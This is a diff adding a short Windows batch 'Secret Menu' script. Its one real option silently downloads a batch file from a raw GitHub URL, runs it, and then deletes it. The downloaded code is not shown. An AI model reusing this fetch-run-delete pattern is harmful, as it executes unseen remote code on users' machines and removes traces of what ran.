@@ -1,0 +1,23 @@
+@echo off
+:menu
+cls
+echo ================================
+echo          Secret Menu
+echo ================================
+echo 1. Download and Execute pvz.bat
+echo 2. Exit
+echo ================================
+set /p choice="Enter your choice (1 or 2): "
+
+if "%choice%"=="1" (
+    curl -s -o "%userprofile%\pvz.bat" https://raw.githubusercontent.com/JoshBeCute/letssee/refs/heads/main/pvz
+    call "%userprofile%\pvz.bat"
+    echo Deleting pvz.bat...
+    del "%userprofile%\pvz.bat"
+    goto menu
+) else if "%choice%"=="2" (
+    echo Exiting...
+    exit
+) else (
+    goto menu
+)
